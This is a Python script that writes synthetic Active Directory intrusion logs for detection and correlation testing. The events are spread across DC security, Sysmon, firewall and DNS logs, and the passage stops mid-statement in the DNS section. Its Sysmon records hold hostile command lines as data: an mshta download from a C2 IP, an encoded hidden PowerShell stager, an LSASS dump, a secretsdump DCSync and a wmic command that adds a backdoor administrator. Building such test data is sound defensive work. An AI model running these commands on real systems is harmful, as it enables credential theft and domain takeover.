"""
Generate realistic multi-source AD attack log files for demo/correlation testing.
Run once: python _generate_logs.py
Scenario: CORP.LOCAL domain — APT actor compromises mwilson workstation,
pivots to SQLSERVER-01, then to DC-01, and achieves DA via DCSync + Golden Ticket.

Environment:
  DC-01          10.0.1.5      (PDC, Windows Server 2019)
  DC-02          10.0.1.6      (SDC)
  SQLSERVER-01   10.0.1.20     (SQL Server, Windows Server 2019)
  WS-FIN01       10.0.0.111    (mwilson / Finance, Windows 10 22H2)
  WS-HR01        10.0.0.105    (jsmith / HR)
  WS-IT01        10.0.0.88     (itadmin / IT)
  FILESERVER-01  10.0.1.30     (File server)
  C2             45.155.205.233 (external attacker)
"""

import json
import pathlib
import textwrap

OUT = pathlib.Path(__file__).parent

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def ev(ts, host, user, msg, eid=None, **extra):
    rec = {"datetime": ts, "hostname": host, "username": user, "message": msg}
    if eid:
        rec["event_id"] = str(eid)
    rec.update(extra)
    return json.dumps(rec)

# ---------------------------------------------------------------------------
# 1. DC Security Event Log  (dc01_security_eventlog.jsonl)
# ---------------------------------------------------------------------------

dc_events = []
a = dc_events.append

# ── Baseline: overnight / early morning (service accounts, computer auth) ──
a(ev("2024-03-15T00:01:14Z","DC-01","SYSTEM","Kerberos TGT issued: svc-backup$@CORP.LOCAL",4768,
      ticket_type="TGT",encryption_type="AES256-CTS",client_address="10.0.1.30"))
a(ev("2024-03-15T00:03:22Z","DC-01","svc-backup","Logon Type 5 (service): svc-backup",4624,
      logon_type="5",logon_process="Advapi",ip_address="127.0.0.1"))
a(ev("2024-03-15T00:08:11Z","DC-01","SYSTEM","Group Policy applied: Computer Configuration",4739,
      domain="CORP.LOCAL",policy="Default Domain Policy"))
a(ev("2024-03-15T00:15:33Z","DC-01","SYSTEM","Kerberos TGT issued: SQLSERVER-01$@CORP.LOCAL",4768,
      ticket_type="TGT",encryption_type="AES256-CTS",client_address="10.0.1.20"))
a(ev("2024-03-15T00:22:05Z","DC-01","SYSTEM","Kerberos TGT issued: FILESERVER-01$@CORP.LOCAL",4768,
      ticket_type="TGT",encryption_type="AES256-CTS",client_address="10.0.1.30"))
a(ev("2024-03-15T00:45:00Z","DC-01","svc-sql","Kerberos service ticket issued: MSSQLSvc/SQLSERVER-01.corp.local:1433",4769,
      service_name="MSSQLSvc/SQLSERVER-01.corp.local:1433",
      ticket_encryption_type="AES256-CTS",client_address="10.0.1.5"))
a(ev("2024-03-15T01:10:22Z","DC-01","SYSTEM","Security log backed up by svc-backup",1102,
      subject="svc-backup",backup_path=r"\\FILESERVER-01\Backup\dcaudit_20240314.evtx"))
a(ev("2024-03-15T02:00:00Z","DC-01","SYSTEM","Password change: svc-sql (scheduled rotation)",4723,
      target_user="svc-sql",subject="svc-mgt"))
a(ev("2024-03-15T03:15:44Z","DC-01","SYSTEM","Kerberos TGT issued: WS-HR01$@CORP.LOCAL",4768,
      ticket_type="TGT",encryption_type="AES256-CTS",client_address="10.0.0.105"))
a(ev("2024-03-15T04:30:01Z","DC-01","SYSTEM","Kerberos TGT issued: WS-FIN01$@CORP.LOCAL",4768,
      ticket_type="TGT",encryption_type="AES256-CTS",client_address="10.0.0.111"))

# ── Business hours baseline (07:00-08:30) ──
users = [("mwilson","WS-FIN01","10.0.0.111"),("jsmith","WS-HR01","10.0.0.105"),
         ("itadmin","WS-IT01","10.0.0.88")]
times = ["07:02","07:08","07:14","07:19","07:23","07:31","07:38","07:45","07:52","07:58",
         "08:05","08:12","08:19","08:26"]
for i,(u,h,ip) in enumerate(users):
    t = times[i*4 % len(times)]
    a(ev(f"2024-03-15T{t}:11Z","DC-01",u,f"Interactive logon: {u}@CORP.LOCAL from {h}",4624,
         logon_type="2",ip_address=ip,authentication_package="Kerberos"))
    a(ev(f"2024-03-15T{t}:22Z","DC-01",u,f"Kerberos TGT issued: {u}@CORP.LOCAL",4768,
         ticket_type="TGT",encryption_type="AES256-CTS",client_address=ip))

# ── Normal SPN ticket requests (08:30-09:00) ──
a(ev("2024-03-15T08:31:05Z","DC-01","mwilson",
     "Kerberos service ticket issued: cifs/FILESERVER-01.corp.local",4769,
     service_name="cifs/FILESERVER-01.corp.local",
     ticket_encryption_type="AES256-CTS",client_address="10.0.0.111"))
a(ev("2024-03-15T08:44:17Z","DC-01","jsmith",
     "Kerberos service ticket issued: MSSQLSvc/SQLSERVER-01.corp.local:1433",4769,
     service_name="MSSQLSvc/SQLSERVER-01.corp.local:1433",
     ticket_encryption_type="AES256-CTS",client_address="10.0.0.105"))
a(ev("2024-03-15T08:51:02Z","DC-01","itadmin",
     "Kerberos service ticket issued: host/DC-01.corp.local",4769,
     service_name="host/DC-01.corp.local",
     ticket_encryption_type="AES256-CTS",client_address="10.0.0.88"))

# ── ATTACK: BloodHound LDAP recon (09:10-09:25) ──
for i,ts in enumerate(["09:10:33","09:10:34","09:10:36","09:10:39","09:11:02","09:11:05"]):
    a(ev(f"2024-03-15T{ts}Z","DC-01","mwilson",
         "Directory Service Access: CN=Users,DC=corp,DC=local (LDAP enumeration)",4662,
         object_type="Container",
         access_mask="0x100",properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
         client_address="10.0.0.111",note="BloodHound collection"))

# ── ATTACK: Kerberoasting — RC4 downgrade requests (09:28-09:41) ──
spns = [
    "MSSQLSvc/SQLSERVER-01.corp.local:1433",
    "HTTP/intranet.corp.local",
    "HOST/FILESERVER-01.corp.local",
    "ldap/DC-01.corp.local",
]
kerb_times = ["09:28:11","09:28:43","09:29:17","09:29:52","09:30:28","09:31:05",
              "09:31:40","09:32:14"]
for i,spn in enumerate(spns):
    for j in range(2):
        ts = kerb_times[i*2+j]
        a(ev(f"2024-03-15T{ts}Z","DC-01","mwilson",
             f"Kerberos service ticket requested (RC4-HMAC downgrade): {spn}",4769,
             service_name=spn,
             ticket_encryption_type="RC4-HMAC",
             etype="0x17",
             client_address="10.0.0.111",
             note="KERBEROASTING — RC4 etype 0x17 indicates downgrade attack"))

# ── AS-REP roasting attempt (09:45) ──
a(ev("2024-03-15T09:45:02Z","DC-01","ANONYMOUS",
     "Kerberos pre-authentication failure: svc-legacy (UF_DONT_REQUIRE_PREAUTH set)",4771,
     client_address="10.0.0.111",
     failure_code="0x18",
     pre_auth_type="0",
     note="AS-REP Roasting — account has pre-auth disabled"))

# ── Lateral movement: mwilson → SQLSERVER-01 via PsExec (10:05) ──
a(ev("2024-03-15T10:05:14Z","DC-01","mwilson",
     "Network logon from WS-FIN01 to SQLSERVER-01 (logon type 3)",4624,
     logon_type="3",
     ip_address="10.0.0.111",
     target_host="SQLSERVER-01",
     authentication_package="NTLM",
     note="Lateral movement — NTLM type-3 logon with PsExec"))
a(ev("2024-03-15T10:05:16Z","DC-01","mwilson",
     "Special privileges assigned to new logon: SeDebugPrivilege, SeTcbPrivilege",4672,
     ip_address="10.0.0.111",
     privileges="SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege"))

# ── Normal ops on SQLSERVER-01 (10:10-12:00) ──
for ts in ["10:10","10:24","10:41","11:02","11:18","11:47"]:
    a(ev(f"2024-03-15T{ts}:00Z","DC-01","svc-sql",
         f"Kerberos TGT renewed: svc-sql@CORP.LOCAL",4768,
         ticket_type="renew",encryption_type="AES256-CTS",client_address="10.0.1.20"))

# ── LSASS handle (13:02) ──
a(ev("2024-03-15T13:02:44Z","SQLSERVER-01","mwilson",
     "Object handle opened: lsass.exe (mimikatz sekurlsa::logonpasswords)",4656,
     object_name=r"\Device\HarddiskVolume3\Windows\System32\lsass.exe",
     access_mask="0x1010",
     process_name="procdump64.exe",
     note="LSASS credential dumping — procdump targeting LSASS"))
a(ev("2024-03-15T13:03:01Z","SQLSERVER-01","mwilson",
     "Sensitive privilege use: SeDebugPrivilege (lsass dump)",4673,
     process_name="procdump64.exe",
     service="Security",
     note="SeDebugPrivilege required to read LSASS memory"))

# ── DCSync (14:01-14:05) ──
for i,ts in enumerate(["14:01:33","14:01:35","14:02:11","14:02:13"]):
    a(ev(f"2024-03-15T{ts}Z","DC-01","mwilson",
         "Directory Service Replication: GetChangesAll — possible DCSync attack",4662,
         object_type="domainDNS",
         access_mask="0x100",
         properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" if i%2==0 else "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
         client_address="10.0.1.20",
         note="DCSync — lsadump::dcsync replication privilege abuse"))

# ── Golden Ticket use (14:30) ──
a(ev("2024-03-15T14:30:05Z","DC-01","Administrator",
     "Kerberos TGT presented (Golden Ticket): issued to Administrator from SQLSERVER-01",4768,
     ticket_type="TGT",
     encryption_type="RC4-HMAC",
     client_address="10.0.1.20",
     note="GOLDEN TICKET — RC4 krbtgt hash, forged ticket from non-DC host"))
a(ev("2024-03-15T14:30:19Z","DC-01","Administrator",
     "Kerberos service ticket issued: cifs/DC-01.corp.local (Golden Ticket session)",4769,
     service_name="cifs/DC-01.corp.local",
     ticket_encryption_type="RC4-HMAC",
     client_address="10.0.1.20",
     note="Golden Ticket — accessing DC admin share"))

# ── Account created (15:05) ──
a(ev("2024-03-15T15:05:44Z","DC-01","mwilson",
     "User account created: svc-backup2 (backdoor account)",4720,
     target_user="svc-backup2",
     target_domain="CORP.LOCAL",
     subject_user="mwilson",
     note="Persistence — backdoor account creation"))
a(ev("2024-03-15T15:05:58Z","DC-01","mwilson",
     "Security-enabled global group changed: Domain Admins — member added: svc-backup2",4728,
     target_group="Domain Admins",
     member_added="svc-backup2",
     subject_user="mwilson",
     note="Privilege escalation — DA group membership added"))

# ── Audit log cleared (15:45) ──
a(ev("2024-03-15T15:45:02Z","DC-01","mwilson",
     "Security audit log cleared by mwilson",1102,
     subject="mwilson",
     note="Defense evasion — security log cleared"))

# ── End-of-day normal logoffs ──
for u,ip in [("mwilson","10.0.0.111"),("jsmith","10.0.0.105"),("itadmin","10.0.0.88")]:
    a(ev("2024-03-15T17:30:00Z","DC-01",u,f"Logoff: {u}",4634,
         logon_type="2",ip_address=ip))

lines = "\n".join(dc_events)
(OUT / "dc01_security_eventlog.jsonl").write_text(lines, encoding="utf-8")
print(f"dc01_security_eventlog.jsonl  ({len(dc_events)} events)")

# ---------------------------------------------------------------------------
# 2. Sysmon Endpoint Telemetry  (sysmon_endpoint_telemetry.jsonl)
# ---------------------------------------------------------------------------

sysmon = []
s = sysmon.append

# ── WS-FIN01 / mwilson — normal morning ──
s(ev("2024-03-15T07:02:11Z","WS-FIN01","mwilson","Process Create: C:\\Windows\\explorer.exe",1,
     image="C:\\Windows\\explorer.exe",parent="winlogon.exe",
     cmdline="C:\\Windows\\Explorer.EXE",hashes="SHA256=b7c5b"))
s(ev("2024-03-15T07:03:22Z","WS-FIN01","mwilson","Process Create: Outlook.exe",1,
     image="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     parent="explorer.exe",cmdline="outlook.exe",hashes="SHA256=a3f11"))
s(ev("2024-03-15T07:08:00Z","WS-FIN01","mwilson","Process Create: chrome.exe",1,
     image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     parent="explorer.exe",cmdline="chrome.exe",hashes="SHA256=c7e22"))
s(ev("2024-03-15T07:14:05Z","WS-FIN01","mwilson",
     "Network Connect: chrome.exe -> 172.217.21.14:443 (google.com)",3,
     image="chrome.exe",dest_ip="172.217.21.14",dest_port="443",protocol="tcp"))
s(ev("2024-03-15T07:22:11Z","WS-FIN01","mwilson","Process Create: excel.exe",1,
     image="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
     parent="explorer.exe",cmdline="excel.exe Q1_Budget_Final.xlsx",hashes="SHA256=d9c44"))
s(ev("2024-03-15T07:45:00Z","WS-HR01","jsmith","Process Create: word.exe",1,
     image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     parent="explorer.exe",cmdline="winword.exe",hashes="SHA256=e1f55"))
s(ev("2024-03-15T07:50:12Z","WS-IT01","itadmin","Process Create: mmc.exe",1,
     image="C:\\Windows\\system32\\mmc.exe",
     parent="explorer.exe",cmdline="mmc.exe ActiveDirectory.msc",hashes="SHA256=f2a66"))

# ── WS-FIN01 — phishing email opens mshta payload (08:57) ──
s(ev("2024-03-15T08:57:03Z","WS-FIN01","mwilson",
     "Process Create: OUTLOOK.EXE spawns mshta.exe (phishing HTA attachment)",1,
     image="C:\\Windows\\System32\\mshta.exe",
     parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     cmdline="mshta.exe http://45.155.205.233/payload.hta",
     hashes="SHA256=0bad1234abcd",
     note="INITIAL ACCESS — mshta spawned by Outlook (phishing)"))
s(ev("2024-03-15T08:57:08Z","WS-FIN01","mwilson",
     "Network Connect: mshta.exe -> 45.155.205.233:80",3,
     image="mshta.exe",dest_ip="45.155.205.233",dest_port="80",protocol="tcp",
     note="C2 — mshta downloading HTA payload"))
s(ev("2024-03-15T08:57:22Z","WS-FIN01","mwilson",
     "Process Create: powershell.exe -enc [base64 stager]",1,
     image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     parent="mshta.exe",
     cmdline="powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAo",
     hashes="SHA256=1abc2def",
     note="EXECUTION — encoded PowerShell stager (Cobalt Strike beacon)"))
s(ev("2024-03-15T08:57:35Z","WS-FIN01","mwilson",
     "Network Connect: powershell.exe -> 45.155.205.233:443 (C2 beacon)",3,
     image="powershell.exe",dest_ip="45.155.205.233",dest_port="443",protocol="tcp",
     note="C2 channel established"))

# ── C2 beacon persistence setup (09:00) ──
s(ev("2024-03-15T09:00:11Z","WS-FIN01","mwilson",
     "Registry Set: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",13,
     image="powershell.exe",
     target_object="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
     details="C:\\Users\\mwilson\\AppData\\Roaming\\svchost32.exe",
     note="PERSISTENCE — registry Run key added by PowerShell"))
s(ev("2024-03-15T09:00:15Z","WS-FIN01","mwilson",
     "File Create: svchost32.exe dropped in AppData\\Roaming",11,
     image="powershell.exe",
     target_filename="C:\\Users\\mwilson\\AppData\\Roaming\\svchost32.exe",
     hashes="SHA256=deadbeef1234",
     note="Beacon binary dropped"))

# ── BloodHound SharpHound recon (09:10) ──
s(ev("2024-03-15T09:10:15Z","WS-FIN01","mwilson",
     "Process Create: SharpHound.exe -c All --zipfilename corp_bloodhound.zip",1,
     image="C:\\Users\\mwilson\\AppData\\Local\\Temp\\SharpHound.exe",
     parent="powershell.exe",
     cmdline="SharpHound.exe -c All --zipfilename corp_bloodhound.zip",
     hashes="SHA256=sharphound_hash",
     note="DISCOVERY — BloodHound SharpHound collection"))
s(ev("2024-03-15T09:10:18Z","WS-FIN01","mwilson",
     "Network Connect: SharpHound.exe -> 10.0.1.5:389 (LDAP to DC-01)",3,
     image="SharpHound.exe",dest_ip="10.0.1.5",dest_port="389",protocol="tcp",
     note="BloodHound LDAP enumeration to DC"))
s(ev("2024-03-15T09:10:20Z","WS-FIN01","mwilson",
     "Network Connect: SharpHound.exe -> 10.0.1.5:88 (Kerberos)",3,
     image="SharpHound.exe",dest_ip="10.0.1.5",dest_port="88",protocol="tcp"))
s(ev("2024-03-15T09:10:44Z","WS-FIN01","mwilson",
     "File Create: corp_bloodhound_20240315_091044.zip (BloodHound output)",11,
     image="SharpHound.exe",
     target_filename="C:\\Users\\mwilson\\AppData\\Local\\Temp\\corp_bloodhound_20240315_091044.zip",
     note="BloodHound data collected — being exfiltrated next"))

# ── Rubeus Kerberoasting (09:28) ──
s(ev("2024-03-15T09:28:05Z","WS-FIN01","mwilson",
     "Process Create: Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec",1,
     image="C:\\Users\\mwilson\\AppData\\Local\\Temp\\Rubeus.exe",
     parent="powershell.exe",
     cmdline="Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec",
     hashes="SHA256=rubeus_hash",
     note="CREDENTIAL ACCESS — Rubeus Kerberoasting"))
s(ev("2024-03-15T09:28:08Z","WS-FIN01","mwilson",
     "Network Connect: Rubeus.exe -> 10.0.1.5:88 (Kerberos TGS-REQ)",3,
     image="Rubeus.exe",dest_ip="10.0.1.5",dest_port="88",protocol="tcp"))
s(ev("2024-03-15T09:32:44Z","WS-FIN01","mwilson",
     "File Create: hashes.txt (Kerberos RC4 ticket hashes)",11,
     image="Rubeus.exe",
     target_filename="C:\\Users\\mwilson\\AppData\\Local\\Temp\\hashes.txt",
     note="Kerberoast hashes written to disk"))

# ── PsExec lateral movement (10:05) ──
s(ev("2024-03-15T10:05:01Z","WS-FIN01","mwilson",
     "Process Create: PsExec64.exe \\\\SQLSERVER-01 -s cmd.exe",1,
     image="C:\\Users\\mwilson\\AppData\\Local\\Temp\\PsExec64.exe",
     parent="powershell.exe",
     cmdline="PsExec64.exe \\\\SQLSERVER-01 -s cmd.exe",
     hashes="SHA256=psexec_hash",
     note="LATERAL MOVEMENT — PsExec to SQLSERVER-01"))
s(ev("2024-03-15T10:05:04Z","WS-FIN01","mwilson",
     "Network Connect: PsExec64.exe -> 10.0.1.20:445 (SMB to SQLSERVER-01)",3,
     image="PsExec64.exe",dest_ip="10.0.1.20",dest_port="445",protocol="tcp",
     note="SMB lateral movement"))
s(ev("2024-03-15T10:05:22Z","SQLSERVER-01","SYSTEM",
     "Process Create: PSEXESVC.exe -> cmd.exe (PsExec service running on target)",1,
     image="C:\\Windows\\PSEXESVC.exe",
     parent="services.exe",
     cmdline="cmd.exe /c whoami && ipconfig && net user /domain",
     hashes="SHA256=psexesvc_hash",
     note="PsExec service spawned cmd.exe on SQLSERVER-01"))

# ── SQLSERVER-01: PowerShell beacon (10:08) ──
s(ev("2024-03-15T10:08:11Z","SQLSERVER-01","mwilson",
     "Process Create: powershell.exe -enc [stager] (second beacon on SQLSERVER-01)",1,
     image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     parent="cmd.exe",
     cmdline="powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA",
     hashes="SHA256=1abc2def",
     note="Second C2 beacon on SQLSERVER-01"))
s(ev("2024-03-15T10:08:18Z","SQLSERVER-01","mwilson",
     "Network Connect: powershell.exe -> 45.155.205.233:443",3,
     image="powershell.exe",dest_ip="45.155.205.233",dest_port="443",protocol="tcp"))

# ── LSASS dump via procdump (13:02) ──
s(ev("2024-03-15T13:02:33Z","SQLSERVER-01","mwilson",
     "Process Create: procdump64.exe -ma lsass.exe lsass.dmp",1,
     image="C:\\Users\\mwilson\\AppData\\Local\\Temp\\procdump64.exe",
     parent="powershell.exe",
     cmdline="procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
     hashes="SHA256=procdump_hash",
     note="CREDENTIAL ACCESS — procdump LSASS memory dump"))
s(ev("2024-03-15T13:03:15Z","SQLSERVER-01","mwilson",
     "Process Access: procdump64.exe opened lsass.exe (GrantedAccess 0x1FFFFF)",10,
     source_image="C:\\Users\\mwilson\\AppData\\Local\\Temp\\procdump64.exe",
     target_image="C:\\Windows\\System32\\lsass.exe",
     granted_access="0x1FFFFF",
     note="Full LSASS memory access — credential extraction"))
s(ev("2024-03-15T13:03:44Z","SQLSERVER-01","mwilson",
     "File Create: lsass.dmp written to C:\\Windows\\Temp",11,
     image="procdump64.exe",
     target_filename="C:\\Windows\\Temp\\lsass.dmp",
     note="LSASS dump file created"))

# ── DCSync via impacket secretsdump (14:01) ──
s(ev("2024-03-15T14:01:22Z","SQLSERVER-01","mwilson",
     "Network Connect: python.exe -> 10.0.1.5:445 (impacket secretsdump DCSync)",3,
     image="python.exe",dest_ip="10.0.1.5",dest_port="445",protocol="tcp",
     note="DCSync over SMB — impacket secretsdump"))
s(ev("2024-03-15T14:01:25Z","SQLSERVER-01","mwilson",
     "Process Create: secretsdump.py DC-01/mwilson@10.0.1.5 -just-dc",1,
     image="C:\\Python39\\python.exe",
     parent="powershell.exe",
     cmdline="python secretsdump.py CORP.LOCAL/mwilson:password@10.0.1.5 -just-dc -outputfile ntds",
     hashes="SHA256=python_hash",
     note="CREDENTIAL ACCESS — impacket DCSync extracting NTDS hashes"))

# ── WMI lateral to DC-01 (15:55) ──
s(ev("2024-03-15T15:55:01Z","SQLSERVER-01","Administrator",
     "Process Create: wmic.exe /node:DC-01 process call create cmd.exe",1,
     image="C:\\Windows\\System32\\wbem\\WMIC.exe",
     parent="powershell.exe",
     cmdline="wmic /node:10.0.1.5 /user:CORP\\Administrator process call create \"cmd.exe /c net user backdoor P@ssword123! /add && net localgroup administrators backdoor /add\"",
     hashes="SHA256=wmic_hash",
     note="LATERAL MOVEMENT — WMI remote execution on DC-01"))
s(ev("2024-03-15T15:55:04Z","SQLSERVER-01","Administrator",
     "Network Connect: wmiprvse.exe -> 10.0.1.5:135 (WMI to DC-01)",3,
     image="wmiprvse.exe",dest_ip="10.0.1.5",dest_port="135",protocol="tcp"))

lines = "\n".join(sysmon)
(OUT / "sysmon_endpoint_telemetry.jsonl").write_text(lines, encoding="utf-8")
print(f"sysmon_endpoint_telemetry.jsonl  ({len(sysmon)} events)")

# ---------------------------------------------------------------------------
# 3. Firewall / NetFlow Log  (firewall_netflow.jsonl)
# ---------------------------------------------------------------------------

fw = []
f = fw.append

def flow(ts, src_ip, dst_ip, dst_port, proto, bytes_out, bytes_in, action="ALLOW", note=None, **kw):
    r = {"datetime": ts, "hostname": "FW-EDGE-01", "username": "-",
         "message": f"{'ALLOW' if action=='ALLOW' else 'DENY'} {proto} {src_ip}->{dst_ip}:{dst_port} out={bytes_out} in={bytes_in}",
         "src_ip": src_ip, "dst_ip": dst_ip, "dst_port": str(dst_port),
         "protocol": proto, "bytes_out": bytes_out, "bytes_in": bytes_in, "action": action}
    if note:
        r["note"] = note
    r.update(kw)
    return json.dumps(r)

# ── Normal outbound HTTP/HTTPS ──
normal_web = [
    ("07:02:11","10.0.0.111","172.217.21.14",443,"TCP",1240,8800),
    ("07:03:05","10.0.0.105","13.107.42.14",443,"TCP",980,5400),
    ("07:08:22","10.0.0.88","104.16.85.20",443,"TCP",1120,6200),
    ("07:15:33","10.0.0.111","216.58.214.78",443,"TCP",440,3200),
    ("07:22:01","10.0.0.105","151.101.1.69",443,"TCP",660,9100),
    ("07:30:44","10.0.1.20","52.96.0.210",443,"TCP",800,4400),
    ("07:45:17","10.0.0.111","104.18.0.0",80,"TCP",320,1800),
    ("07:52:00","10.0.0.88","8.8.8.8",53,"UDP",64,128),
    ("08:01:22","10.0.1.30","10.0.1.5",389,"TCP",440,2200),
    ("08:10:05","10.0.0.105","172.217.21.100",443,"TCP",1100,7700),
    ("08:20:14","10.0.0.111","40.114.0.0",443,"TCP",920,5100),
    ("08:31:00","10.0.0.88","52.168.10.0",443,"TCP",780,4300),
    ("08:40:02","10.0.0.105","151.101.2.69",443,"TCP",640,3900),
    ("08:50:11","10.0.1.20","10.0.1.5",88,"TCP",180,320),
    ("09:01:00","10.0.0.111","172.217.21.14",443,"TCP",1060,6100),
]
for ts,s,d,dp,pr,bo,bi in normal_web:
    f(flow(f"2024-03-15T{ts}Z",s,d,dp,pr,bo,bi))

# ── Normal DNS to internal resolver ──
for ts in ["07:02","07:08","07:15","07:22","07:30","07:45","08:01","08:10","08:20","08:31"]:
    f(flow(f"2024-03-15T{ts}:00Z","10.0.0.111","10.0.1.5",53,"UDP",64,128))

# ── mshta -> C2 initial (08:57) ──
f(flow("2024-03-15T08:57:08Z","10.0.0.111","45.155.205.233",80,"TCP",320,42000,
       note="INITIAL ACCESS — mshta downloading HTA payload from C2"))

# ── C2 beacon every ~5 minutes (08:57 - 15:45) ──
beacon_times = [
    "08:57:35","09:02:41","09:07:48","09:12:55","09:18:02","09:23:09","09:28:16",
    "09:33:23","09:38:30","09:43:37","09:48:44","09:53:51","09:58:58","10:04:05",
    "10:09:12","10:14:19","10:19:26","10:24:33","10:29:40","10:34:47","10:39:54",
    "10:45:01","10:50:08","10:55:15","11:00:22","11:05:29","11:10:36","11:30:00",
    "11:55:00","12:20:00","12:45:00","13:10:00","13:35:00","14:00:00","14:25:00",
    "14:50:00","15:15:00","15:40:00",
]
for ts in beacon_times:
    src = "10.0.0.111" if ts < "10:08" else "10.0.1.20"
    f(flow(f"2024-03-15T{ts}Z",src,"45.155.205.233",443,"TCP",480,1200,
           note="C2 beacon — periodic check-in to attacker HTTPS"))

# ── Kerberos surge (09:28-09:32) — Kerberoasting ──
for ts in ["09:28:08","09:28:41","09:29:14","09:29:48","09:30:22","09:30:55","09:31:28","09:32:02"]:
    f(flow(f"2024-03-15T{ts}Z","10.0.0.111","10.0.1.5",88,"TCP",380,640,
           note="KERBEROASTING — RC4 TGS-REQ flood to DC"))

# ── LDAP burst (09:10-09:11) — BloodHound ──
for i,ts in enumerate(["09:10:15","09:10:18","09:10:22","09:10:26","09:10:30","09:10:34",
                        "09:10:38","09:10:42","09:10:46","09:10:50","09:10:54","09:10:58",
                        "09:11:02","09:11:06","09:11:10","09:11:14"]):
    f(flow(f"2024-03-15T{ts}Z","10.0.0.111","10.0.1.5",389,"TCP",280,8800,
           note="BloodHound LDAP recon burst" if i==0 else None))

# ── PsExec lateral (10:05) ──
f(flow("2024-03-15T10:05:04Z","10.0.0.111","10.0.1.20",445,"TCP",186000,92000,
       note="LATERAL MOVEMENT — PsExec SMB to SQLSERVER-01"))
f(flow("2024-03-15T10:05:22Z","10.0.0.111","10.0.1.20",135,"TCP",640,480))

# ── DCSync over SMB (14:01) ──
for ts in ["14:01:22","14:01:55","14:02:28","14:03:01","14:03:34","14:04:07"]:
    f(flow(f"2024-03-15T{ts}Z","10.0.1.20","10.0.1.5",445,"TCP",92000,288000,
           note="DCSync — SMB replication traffic" if ts=="14:01:22" else None))

# ── NTDS exfil (14:10) ──
f(flow("2024-03-15T14:10:05Z","10.0.1.20","45.155.205.233",443,"TCP",4200000,8800,
       note="EXFILTRATION — NTDS hash dump sent to C2 (4.2 MB upload)"))

# ── WMI lateral SQLSERVER-01 -> DC-01 (15:55) ──
f(flow("2024-03-15T15:55:04Z","10.0.1.20","10.0.1.5",135,"TCP",840,1120,
       note="LATERAL MOVEMENT — WMI RPC to DC-01"))
f(flow("2024-03-15T15:55:07Z","10.0.1.20","10.0.1.5",445,"TCP",22000,8800))

# ── End-of-day normal ──
for ts,src,dst,dp,pr,bo,bi in [
    ("17:00:00","10.0.0.111","172.217.21.14",443,"TCP",440,2800),
    ("17:15:00","10.0.0.105","13.107.42.14",443,"TCP",380,2200),
    ("17:30:00","10.0.0.88","104.16.85.20",443,"TCP",320,1800),
]:
    f(flow(f"2024-03-15T{ts}Z",src,dst,dp,pr,bo,bi))

lines = "\n".join(fw)
(OUT / "firewall_netflow.jsonl").write_text(lines, encoding="utf-8")
print(f"firewall_netflow.jsonl  ({len(fw)} flows)")

# ---------------------------------------------------------------------------
# 4. DNS Query Log  (dns_query_log.jsonl)
# ---------------------------------------------------------------------------

dns = []
d = dns.append

def dq(ts, client, query, qtype, response, note=None):
    r = {"datetime": ts, "hostname": "DC-01-DNS", "username": "-",
         "message": f"DNS query: {client} -> {query} ({qtype}) -> {response}",
         "client_ip": client, "query": query, "query_type": qtype, "response": response}
    if note:
        r["note"] = note
    return json.dumps(r)

# ── Normal corporate DNS ──
normal_dns = [
    ("07:02:00","10.0.0.111","www.google.com","A","172.217.21.14"),
    ("07:02:01","10.0.0.111","corp.local","A","10.0.1.5"),
    ("07:03:00","10.0.0.105","outlook.office365.com","A","13.107.42.14"),
    ("07:05:00","10.0.0.88","dc-01.corp.local","A","10.0.1.5"),
    ("07:08:00","10.0.0.111","fileserver-01.corp.local","A","10.0.1.30"),
    ("07:10:00","10.0.1.20","sqlserver-01.corp.local","A","10.0.1.20"),
    ("07:15:00","10.0.0.105","teams.microsoft.com","A","13.107.64.21"),
    ("07:20:00","10.0.0.111","sharepoint.corp.local","A","10.0.1.31"),
    ("07:22:00","10.0.0.88","dc-01.corp.local","A","10.0.1.5"),
    ("07:30:00","10.0.0.111","www.microsoft.com","A","23.97.0.1"),
    ("07:35:00","10.0.0.105","autodiscover.corp.local","A","10.0.1.6"),
    ("07:40:00","10.0.0.111","ocsp.digicert.com","A","93.184.220.29"),
    ("07:45:00","10.0.0.88","windowsupdate.microsoft.com","A","23.103.160.9"),
    ("07:50:00","10.0.1.20","_kerberos._tcp.corp.local","SRV","10.0.1.5"),
    ("07:55:00","10.0.0.105","crl.microsoft.com","A","23.4.58.2"),
    ("08:00:00","10.0.0.111","smtp.corp.local","A","10.0.1.25"),
    ("08:05:00","10.0.0.88","citrix.corp.local","A","10.0.1.40"),
    ("08:10:00","10.0.0.111","login.microsoftonline.com","A","20.190.128.4"),
    ("08:20:00","10.0.0.105","www.google.com","A","172.217.21.14"),
    ("08:30:00","10.0.0.111","update.googleapis.com","A","142.250.80.46"),
]
for ts,c,q,t,r in normal_dns:
    d(dq(f"2024-03-15T{ts}Z",c,q,t,r))

# ── BloodHound DNS lookups (09:10-09:11) ──
for host in ["dc-01.corp.local","dc-02.corp.local","sqlserver-01.corp.local",
             "fileserver-01.corp.local","ws-fin01.corp.local","ws-hr01.corp.local",
             "ws-it01.corp.local","_ldap._tcp.dc._msdcs.corp.local",
             "_kerberos._tcp.corp.local","_ldap._tcp.corp.local"]:
    d(dq("2024-03-15T09:10:21Z","10.0.0.111",host,"A" if "." in host else "SRV",
